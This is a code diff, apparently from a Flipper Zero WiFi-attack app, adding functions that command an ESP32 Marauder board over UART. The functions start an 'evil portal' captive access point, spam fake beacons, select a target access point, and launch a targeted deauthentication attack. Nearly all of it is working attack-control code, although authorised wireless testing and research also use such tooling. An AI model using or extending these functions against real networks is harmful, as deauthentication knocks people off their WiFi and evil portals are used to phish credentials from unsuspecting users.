@@ -528,6 +528,53 @@ void fpwn_marauder_stop(FPwnMarauder* m) {
     FURI_LOG_I(TAG, "stopped");
 }
 
+void fpwn_marauder_evil_portal(FPwnMarauder* m, const char* ssid) {
+    furi_assert(m);
+    /* Start evil portal — Marauder hosts a captive portal AP */
+    char cmd[128];
+    snprintf(cmd, sizeof(cmd), "evilportal -s %s", ssid);
+    fpwn_wifi_uart_send(m->uart, cmd);
+
+    furi_mutex_acquire(m->mutex, FuriWaitForever);
+    m->state = FPwnMarauderStateEvilPortal;
+    furi_mutex_release(m->mutex);
+
+    FURI_LOG_I(TAG, "evil portal started: %s", ssid);
+}
+
+void fpwn_marauder_beacon_spam(FPwnMarauder* m) {
+    furi_assert(m);
+    fpwn_wifi_uart_send(m->uart, "attack -t beacon -l");
+
+    furi_mutex_acquire(m->mutex, FuriWaitForever);
+    m->state = FPwnMarauderStateBeaconSpam;
+    furi_mutex_release(m->mutex);
+
+    FURI_LOG_I(TAG, "beacon spam started");
+}
+
+void fpwn_marauder_select_ap(FPwnMarauder* m, uint8_t ap_idx) {
+    furi_assert(m);
+    char cmd[32];
+    snprintf(cmd, sizeof(cmd), "select -a %u", (unsigned)ap_idx);
+    fpwn_wifi_uart_send(m->uart, cmd);
+    FURI_LOG_I(TAG, "selected AP %u", (unsigned)ap_idx);
+}
+
+void fpwn_marauder_deauth_targeted(FPwnMarauder* m, uint8_t ap_idx) {
+    furi_assert(m);
+    /* First select the AP, then deauth */
+    fpwn_marauder_select_ap(m, ap_idx);
+    furi_delay_ms(200); /* Small delay for Marauder to process select */
+    fpwn_wifi_uart_send(m->uart, "attack -t deauth");
+
+    furi_mutex_acquire(m->mutex, FuriWaitForever);
+    m->state = FPwnMarauderStateDeauth;
+    furi_mutex_release(m->mutex);
+
+    FURI_LOG_I(TAG, "targeted deauth AP %u", (unsigned)ap_idx);
+}
+
 /* --------------------------------------------------------------------------
  * Log callback
  * -------------------------------------------------------------------------- */
